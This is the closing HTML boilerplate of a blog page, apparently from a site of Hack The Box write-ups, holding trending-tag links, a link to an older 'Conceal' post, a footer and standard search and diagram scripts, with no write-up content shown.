    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/easy/">EASY</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/snmp/">SNMP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/clamav-milter/">ClamAV-Milter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/craftcms/">CraftCMS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exiftool/">Exiftool</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hard/">HARD</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/juicypotato/">JuicyPotato</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="d-none ps-0 pe-4">
    <h2 class="panel-heading ps-3 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  
    











            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Hack-The-Box-Conceal/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Hack The Box - Conceal</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3"
>
  <p>
    © <time>2025</time>

    
    <a href="https://github.com/arthurhendrich"
      >H3NDR1CH</a
    >.  
    <span
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
    >Some rights reserved.</span>
    
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/easy/">EASY</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/snmp/">SNMP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/clamav-milter/">ClamAV-Milter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/craftcms/">CraftCMS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exiftool/">Exiftool</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hard/">HARD</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/juicypotato/">JuicyPotato</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->
    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js,npm/mermaid@10.9.0/dist/mermaid.min.js"></script>







<script src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  <!-- mermaid-js loader -->
<script type="text/javascript">
  function updateMermaid(event) {
    if (event.source === window && event.data && event.data.direction === ModeToggle.ID) {
      const mode = event.data.message;

      if (typeof mermaid === 'undefined') {
        return;
      }

      let expectedTheme = mode === ModeToggle.DARK_MODE ? 'dark' : 'default';
      let config = { theme: expectedTheme };const mermaidList = document.getElementsByClassName('mermaid');

      [...mermaidList].forEach((elem) => {
        const svgCode = elem.previousSibling.children.item(0).innerHTML;
        elem.innerHTML = svgCode;
        elem.removeAttribute('data-processed');
      });

      mermaid.initialize(config);
      mermaid.init(undefined, '.mermaid');
    }
  }

  (function () {
    let initTheme = 'default';
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = 'dark';
    }

    let mermaidConf = {
      theme: initTheme};const basicList = document.getElementsByClassName('language-mermaid');
    [...basicList].forEach((elem) => {
      const svgCode = elem.textContent;
      const backup = elem.parentElement;
      backup.classList.add('d-none');let mermaid = document.createElement('pre');
      mermaid.classList.add('mermaid');
      const text = document.createTextNode(svgCode);
      mermaid.appendChild(text);
      backup.after(mermaid);
    });

    mermaid.initialize(mermaidConf);
    window.addEventListener('message', updateMermaid);
  })();
</script>






    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

